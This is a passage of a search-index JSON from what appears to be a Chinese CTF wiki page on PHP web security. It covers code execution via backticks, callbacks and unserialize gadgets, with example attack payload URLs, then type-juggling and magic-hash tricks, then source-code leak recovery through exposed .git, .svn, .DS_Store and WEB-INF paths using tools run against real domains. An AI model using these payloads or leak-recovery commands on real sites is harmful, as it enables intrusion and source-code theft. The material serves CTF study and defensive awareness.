?>","title":"\u52a8\u6001\u51fd\u6570\u6267\u884c"},{"location":"web/php/php/#_12","text":"<?php echo `ls -al` ; ?>","title":"\u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c"},{"location":"web/php/php/#curly-syntax","text":"PHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002 <?php $var = \"aaabbbccc ${ `ls` } \" ; ?> <?php $foobar = \"phpinfo\" ; $ { \"foobar\" }(); ?>","title":"Curly Syntax"},{"location":"web/php/php/#_13","text":"\u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $evil_callback = $_GET [ \"callback\" ]; $some_array = array ( 0 , 1 , 2 , 3 ); $new_array = array_map ( $evil_callback , $some_array ); ?> \u653b\u51fb payload http://www.a.com/index.php?callback=phpinfo","title":"\u56de\u8c03\u51fd\u6570"},{"location":"web/php/php/#_14","text":"\u5982\u679c unserialize() \u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86 __destruct() \u6216 __wakeup() \u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php class Example { var $var = \"\" ; function __destruct () { eval ( $this -> var ); } } unserialize ( $_GET [ \"saved_code\" ]); ?> \u653b\u51fb payload http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";}","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"web/php/php/#php_1","text":"","title":"PHP \u7279\u6027"},{"location":"web/php/php/#_15","text":"<?php $var = 1 ; $var = array (); $var = \"string\" ; ?> php \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002 \u6bd4\u5982\u5728 $a == $b \u7684\u6bd4\u8f83\u4e2d $a = null; $b = false; //\u4e3a\u771f $a = ''; $b = 0; //\u540c\u6837\u4e3a\u771f \u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002 0=='0' //true 0 == 'abcdefg' //true 0 === 'abcdefg' //false 1 == '1abcdef' //true","title":"\u6570\u7ec4"},{"location":"web/php/php/#hash","text":"\"0e132456789\"==\"0e7124511451155\" //true \"0e123456abc\"==\"0e1dddada\" //false \"0e1abc\"==\"0\" //true \u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86 0e\\d+ \u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3 0e\\d+ \u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002","title":"\u9b54\u6cd5 Hash"},{"location":"web/php/php/#_16","text":"\"0x1e240\"==\"123456\" //true \"0x1e240\"==123456 //true \"0x1e240\"==\"1e240\" //false \u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f 0x \u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c 0x1240 \u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e int \u7c7b\u578b\u548c string \u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002","title":"\u5341\u516d\u8fdb\u5236\u8f6c\u6362"},{"location":"web/php/php/#_17","text":"\u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f int \u8f6c\u6362\u4e3a string \uff0c string \u8f6c\u6362\u4e3a int \u3002 int \u8f6c string $var = 5; \u65b9\u5f0f1\uff1a$item = (string)$var; \u65b9\u5f0f2\uff1a$item = strval($var); string \u8f6c int \uff1a intval() \u51fd\u6570\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002 var_dump(intval('2')) //2 var_dump(intval('3abcd')) //3 var_dump(intval('abcd')) //0 \u8bf4\u660e intval() \u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 \u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a if(intval($a)>1000) { mysql_query(\"select * from news where id=\".$a) } \u8fd9\u4e2a\u65f6\u5019 $a \u7684\u503c\u6709\u53ef\u80fd\u662f 1002 union \u3002","title":"\u7c7b\u578b\u8f6c\u6362"},{"location":"web/php/php/#_18","text":"\u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002 md5() $array1[] = array( \"foo\" => \"bar\", \"bar\" => \"foo\", ); $array2 = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump(md5($array1)==md5($array2)); //true PHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f string md5 ( string $str [, bool $raw_output = false ] ) \uff0c md5() \u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c md5() \u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002 strcmp() strcmp() \u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f intstrcmp ( string $str1 \uff0c string $str2 ) \uff0c\u9700\u8981\u7ed9 strcmp() \u4f20\u9012 2 \u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002 strcmp() \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002 \u5982\u679c\u4f20\u5165\u7ed9\u51fa strcmp() \u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f $array=[1,2,3]; var_dump(strcmp($array,'123')); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002 switch() \u5982\u679c switch() \u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a $i =\"2abc\"; switch ($i) { case 0: case 1: case 2: echo \"i is less than 3 but not negative\"; break; case 3: echo \"i is 3\"; } \u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f i is less than 3 but not negative \uff0c\u662f\u7531\u4e8e switch() \u51fd\u6570\u5c06 $i \u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002 in_array() \u5728 PHP \u624b\u518c\u4e2d\uff0c in_array() \u51fd\u6570\u7684\u89e3\u91ca\u662f bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,\u5982\u679cstrict\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48 in_array \u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad $needle \u662f\u5426\u5728 $haystack \u4e2d\u3002\u5f53 strict \u7684\u503c\u4e3a true \u65f6\uff0c in_array() \u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002 $array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true var_dump(in_array('1bc', $array)); //true \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a 'abc' \u4f1a\u8f6c\u6362\u4e3a 0\uff0c '1bc' \u8f6c\u6362\u4e3a 1\u3002 array_search() \u4e0e in_array() \u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002","title":"\u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027"},{"location":"web/php/php/#_19","text":"","title":"\u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd"},{"location":"web/php/php/#hg","text":"hg init \u65f6\u4f1a\u4ea7\u751f .hg \u6587\u4ef6\u3002 \u5229\u7528\u5de5\u5177 dvcs-ripper","title":"hg \u6e90\u7801\u6cc4\u9732"},{"location":"web/php/php/#git","text":".git \u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002 /.git /.git/HEAD /.git/index /.git/config /.git/description GitHack python GitHack.py http://www.openssl.org/.git/ GitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09 python GitHacker.py http://www.openssl.org/.git/","title":"Git \u6e90\u7801\u6cc4\u9732"},{"location":"web/php/php/#ds_store","text":"Mac OS \u4e2d\u4f1a\u5305\u542b\u6709 .DS_Store \u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002 \u5229\u7528\u5de5\u5177 ds_store_exp python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store hd.zj.qq.com/ \u2514\u2500\u2500 themes \u2514\u2500\u2500 galaxyw \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 css \u2502 \u2514\u2500\u2500 style.min.css \u251c\u2500\u2500 cityData.min.js \u251c\u2500\u2500 images \u2502 \u2514\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-hd.png \u2502 \u251c\u2500\u2500 bg-item-activity.png \u2502 \u251c\u2500\u2500 bg-masker-pop.png \u2502 \u251c\u2500\u2500 btn-bm.png \u2502 \u251c\u2500\u2500 btn-login-qq.png \u2502 \u251c\u2500\u2500 btn-login-wx.png \u2502 \u251c\u2500\u2500 ico-add-pic.png \u2502 \u251c\u2500\u2500 ico-address.png \u2502 \u251c\u2500\u2500 ico-bm.png \u2502 \u251c\u2500\u2500 ico-duration-time.png \u2502 \u251c\u2500\u2500 ico-pop-close.png \u2502 \u251c\u2500\u2500 ico-right-top-delete.png \u2502 \u251c\u2500\u2500 page-login-hd.png \u2502 \u251c\u2500\u2500 pic-masker.png \u2502 \u2514\u2500\u2500 ticket-selected.png \u2514\u2500\u2500 member \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 ace-reset.css \u2502 \u2502 \u2514\u2500\u2500 antd.css \u2502 \u2514\u2500\u2500 lib \u2502 \u251c\u2500\u2500 cityData.min.js \u2502 \u2514\u2500\u2500 ueditor \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 lang \u2502 \u2502 \u2514\u2500\u2500 zh-cn \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u2502 \u251c\u2500\u2500 copy.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 localimage.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 music.png \u2502 \u2502 \u2502 \u2514\u2500\u2500 upload.png \u2502 \u2502 \u2514\u2500\u2500 zh-cn.js \u2502 \u251c\u2500\u2500 php \u2502 \u2502 \u251c\u2500\u2500 action_crawler.php \u2502 \u2502 \u251c\u2500\u2500 action_list.php \u2502 \u2502 \u251c\u2500\u2500 action_upload.php \u2502 \u2502 \u251c\u2500\u2500 config.json \u2502 \u2502 \u251c\u2500\u2500 controller.php \u2502 \u2502 \u2514\u2500\u2500 Uploader.class.php \u2502 \u251c\u2500\u2500 ueditor.all.js \u2502 \u251c\u2500\u2500 ueditor.all.min.js \u2502 \u251c\u2500\u2500 ueditor.config.js \u2502 \u251c\u2500\u2500 ueditor.parse.js \u2502 \u2514\u2500\u2500 ueditor.parse.min.js \u2514\u2500\u2500 static \u251c\u2500\u2500 css \u2502 \u2514\u2500\u2500 page.css \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-table-title.png \u2502 \u251c\u2500\u2500 bg-tab-say.png \u2502 \u251c\u2500\u2500 ico-black-disabled.png \u2502 \u251c\u2500\u2500 ico-black-enabled.png \u2502 \u251c\u2500\u2500 ico-coorption-person.png \u2502 \u251c\u2500\u2500 ico-miss-person.png \u2502 \u251c\u2500\u2500 ico-mr-person.png \u2502 \u251c\u2500\u2500 ico-white-disabled.png \u2502 \u2514\u2500\u2500 ico-white-enabled.png \u2514\u2500\u2500 scripts \u251c\u2500\u2500 js \u2514\u2500\u2500 lib \u2514\u2500\u2500 jquery.min.js 21 directories, 48 files","title":".DS_Store \u6587\u4ef6\u6cc4\u9732"},{"location":"web/php/php/#_20","text":"\u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002 \u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a .rar .zip .7z .tar .tar.gz .bak .txt","title":"\u7f51\u7ad9\u5907\u4efd\u6587\u4ef6"},{"location":"web/php/php/#svn","text":"\u654f\u611f\u6587\u4ef6\uff1a /.svn /.svn/wc.db /.svn/entries dvcs-ripper perl rip-svn.pl -v -u http://www.example.com/.svn/ Seay - SVN","title":"SVN \u6cc4\u9732"},{"location":"web/php/php/#web-inf-webxml","text":"WEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002 WEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a /WEB-INF/web.xml \uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002 /WEB-INF/classes/ \uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728 jar \u6587\u4ef6\u4e2d\u3002 /WEB-INF/lib/ \uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002 /WEB-INF/src/ \uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002 /WEB-INF/database.properties \uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002 \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a location ~ ^/WEB-INF/* { deny all ; } # \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01","title":"WEB-INF / web.xml \u6cc4\u9732"},{"location":"web/php/php/#cvs","text":"http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f http://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784 \u53d6\u56de\u6e90\u7801 bk clone http://url/name dir","title":"CVS \u6cc4\u9732"},{"location":"web/php/php/#_21","text":"\u8bb0\u4e00\u6b21\u62ffwebshell\u8e29\u8fc7\u7684\u5751(\u5982\u4f55\u7528PHP\u7f16\u5199\u4e00\u4e2a\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684\u540e\u95e8)","title":"\u53c2\u8003\u6587\u732e"}]}